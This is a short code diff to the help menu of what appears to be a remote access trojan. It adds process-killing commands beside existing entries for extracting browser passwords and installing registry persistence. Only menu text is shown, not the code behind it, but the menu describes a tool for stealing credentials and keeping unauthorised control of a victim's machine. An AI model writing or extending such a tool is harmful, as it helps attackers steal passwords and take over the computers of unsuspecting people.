@@ -38,6 +38,8 @@ def handle_help():
     browser_creds               Extract Browser Passwords
     ip addr                     Show Network Config
     ps                          List Processes
+    kill <pid>                  Kill Process by PID
+    pkill <name>                Kill Process by Name
 
   [ PERSISTENCE ]
     persistence <RegName> <FileName>   Install Persistence
